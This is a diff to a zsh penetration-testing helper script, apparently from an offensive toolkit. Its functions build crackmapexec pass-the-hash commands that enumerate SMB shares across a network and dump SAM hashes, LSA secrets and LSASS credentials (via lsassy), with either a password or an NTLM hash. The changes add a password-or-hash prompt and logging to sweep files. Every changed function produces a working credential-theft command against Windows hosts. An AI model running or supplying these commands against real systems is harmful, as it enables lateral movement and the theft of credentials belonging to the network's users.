@@ -72,12 +72,12 @@ nb-ad-pth-enum() {
         echo
         __ask "Enter a password for authentication"
         __check-pass
-        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p ${__PASS} --shares | tee -a $(__netpath)/cme-sweep.txt"
+        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p ${__PASS} --shares | tee -a $(__netpath)/cme-SHARES-sweep.txt"
     elif [[ $login == "h" ]]; then
         echo
         __ask "Enter the NTLM hash for authentication"
         __check-hash
-  	    print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth --shares | tee -a $(__netpath)/cme-sweep.txt"
+  	    print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth --shares | tee -a $(__netpath)/cme-SHARES-sweep.txt"
     else
         echo
         __err "Invalid option. Please choose 'p' for password or 'h' for hash."
@@ -88,13 +88,27 @@ nb-ad-pth-sam() {
     __check-project
     nb-vars-set-network
     echo
-    __ask "Enter a user account"
+    __ask "Enter a user account/user list"
 	  __check-user
     echo
-	  __ask "Enter a NTLM hash"
-	  __check-hash
 
-	print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth --sam"
+    __ask "Do you want to log in using a password or a hash? (p/h)"
+    local login && __askvar login "LOGIN_OPTION"
+
+    if [[ $login == "p" ]]; then
+        echo
+        __ask "Enter a password for authentication"
+        __check-pass
+        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p ${__PASS} --sam | tee -a $(__netpath)/cme-SAM-sweep.txt"
+    elif [[ $login == "h" ]]; then
+        echo
+        __ask "Enter the NTLM hash for authentication"
+        __check-hash
+  	    print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth --sam | tee -a $(__netpath)/cme-SAM-sweep.txt"
+    else
+        echo
+        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
+    fi
 }
 
 nb-ad-pth-lsa() {
@@ -104,10 +118,24 @@ nb-ad-pth-lsa() {
     __ask "Enter a user account"
 	  __check-user
     echo
-	  __ask "Enter a NTLM hash"
-	  __check-hash
 
-	print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth --lsa"
+    __ask "Do you want to log in using a password or a hash? (p/h)"
+    local login && __askvar login "LOGIN_OPTION"
+
+    if [[ $login == "p" ]]; then
+        echo
+        __ask "Enter a password for authentication"
+        __check-pass
+        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p ${__PASS} --lsa | tee -a $(__netpath)/cme-LSA-sweep.txt"
+    elif [[ $login == "h" ]]; then
+        echo
+        __ask "Enter the NTLM hash for authentication"
+        __check-hash
+  	    print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth --lsa | tee -a $(__netpath)/cme-LSA-sweep.txt"
+    else
+        echo
+        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
+    fi
 }
 
 nb-ad-pth-lsassy() {
@@ -117,8 +145,22 @@ nb-ad-pth-lsassy() {
     __ask "Enter a user account"
 	  __check-user
     echo
-	  __ask "Enter a NTLM hash"
-	  __check-hash
 
-	print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth -M lsassy"
+    __ask "Do you want to log in using a password or a hash? (p/h)"
+    local login && __askvar login "LOGIN_OPTION"
+
+    if [[ $login == "p" ]]; then
+        echo
+        __ask "Enter a password for authentication"
+        __check-pass
+        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p ${__PASS} -M lsassy | tee -a $(__netpath)/cme-LSASSY-sweep.txt"
+    elif [[ $login == "h" ]]; then
+        echo
+        __ask "Enter the NTLM hash for authentication"
+        __check-hash
+  	    print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth -M lsassy | tee -a $(__netpath)/cme-LSASSY-sweep.txt"
+    else
+        echo
+        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
+    fi
 }
